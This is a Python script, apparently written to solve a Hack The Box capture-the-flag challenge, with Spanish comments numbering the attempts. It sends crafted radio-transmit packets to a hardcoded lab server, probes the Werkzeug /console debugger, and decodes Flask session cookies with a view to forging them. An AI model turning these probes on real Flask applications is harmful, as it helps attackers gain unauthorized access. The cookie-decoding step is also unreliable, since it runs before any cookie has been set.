#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 150: Enviar con TODOS los parámetros posibles simultáneamente
print("[*] INNOVACIÓN 150: Kitchen sink approach")
s = requests.Session()
s.get(base_url)

data = bytes([0xE1, 0xFF])
crc = crc16(data)
packet = (data + struct.pack('<H', crc)).hex().upper()

# Enviar con MUCHOS parámetros
r = s.post(f'{base_url}/transmit', data={
    'freq': '433.92',
    'mod': 'ASK',
    'bits': '1',
    'msg': packet,
    'power': '10',
    'bandwidth': '200',
    'deviation': '25',
    'bitrate': '9600',
    'samplerate': '2000000',
    'preamble': 'AA',
    'syncword': '2DD4',
    'crc': 'on',
    'whitening': 'off',
    'encoding': 'NRZ',
})

print(f"Kitchen sink status: {r.status_code}")

time.sleep(3)
r = s.get(base_url)
if 'HTB{' in r.text:
    print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 151: Explotar el hecho de que es Flask
print("\n[*] INNOVACIÓN 151: Flask-specific attacks")
s = requests.Session()

# Intentar Werkzeug debugger PIN bypass
r = s.get(f'{base_url}/console')
if r.status_code != 404:
    print(f"[+] /console accessible: {r.status_code}")

# Intentar session cookie forging
# Flask sessions son JWT-like pero signed
print("\n[*] Trying to decode Flask session...")
import base64
import zlib

for cookie in s.cookies:
    if cookie.name == 'session':
        parts = cookie.value.split('.')
        if len(parts) >= 2:
            try:
                # Decode payload
                payload = parts[0]
                # Add padding
                padding = len(payload) % 4
                if padding:
                    payload += '=' * (4 - padding)
                
                decoded = base64.urlsafe_b64decode(payload)
                print(f'Session decoded: {decoded}')
                
                # Try decompress
                try:
                    decompressed = zlib.decompress(decoded)
                    print(f'Decompressed: {decompressed}')
                except:
                    pass
            except Exception as e:
                print(f'Error: {e}')

print("\n[*] Innovaciones 150-151 completadas")
